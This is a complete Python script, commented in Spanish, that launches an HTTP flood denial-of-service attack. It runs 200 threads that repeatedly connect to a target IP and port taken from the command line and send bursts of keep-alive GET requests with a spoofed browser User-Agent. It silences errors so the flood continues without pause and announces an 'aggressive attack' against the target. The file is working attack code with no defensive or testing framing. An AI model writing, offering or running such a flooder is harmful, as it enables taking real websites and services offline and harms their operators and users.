import socket
import threading
import sys
import signal
from concurrent.futures import ThreadPoolExecutor

# --- CONFIGURACIÓN DE INTENSIDAD ---
MAX_WORKERS = 200  # Número de atacantes simultáneos
TIMEOUT = 4        # Tiempo de espera para no quedar bloqueado
# -----------------------------------

parar_ataque = False

def realizar_peticiones(target_ip, target_port):
    """Función que ejecuta un hilo de ataque continuo."""
    global parar_ataque
    
    payload = (
        f"GET / HTTP/1.1\r\n"
        f"Host: {target_ip}\r\n"
        f"User-Agent: Mozilla/5.0 (X11; Linux x86_64)\r\n"
        f"Accept: */*\r\n"
        f"Connection: keep-alive\r\n\r\n"
    ).encode('utf-8')

    while not parar_ataque:
        try:
            # Crear un nuevo socket para cada ráfaga o mantenerlo abierto
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.settimeout(TIMEOUT)
                s.connect((target_ip, target_port))
                
                # Enviar ráfagas rápidas dentro de la misma conexión
                for _ in range(10): 
                    if parar_ataque: break
                    s.sendall(payload)
        except Exception:
            # Silenciamos errores para no alentar el bucle con prints
            continue

def handle_exit(sig, frame):
    """Maneja el Ctrl+C para detener todos los hilos."""
    global parar_ataque
    print("\n[!] Deteniendo ataque... Por favor espere a que los hilos cierren.")
    parar_ataque = True
    sys.exit(0)

def main():
    if len(sys.argv) != 3:
        print(f"Uso: python3 {sys.argv[0]} <IP/Dominio> <Puerto>")
        sys.exit(1)

    target = sys.argv[1]
    port = int(sys.argv[2])

    # Registrar la señal de Ctrl+C (SIGINT)
    signal.signal(signal.SIGINT, handle_exit)

    print(f"[*] INICIANDO ATAQUE AGRESIVO contra {target}:{port}")
    print(f"[*] Hilos activos: {MAX_WORKERS}. Presiona Ctrl+C para abortar.")

    # Pool de hilos para gestionar la masa de atacantes
    with ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:
        for _ in range(MAX_WORKERS):
            executor.submit(realizar_peticiones, target, port)

if __name__ == "__main__":
    main()
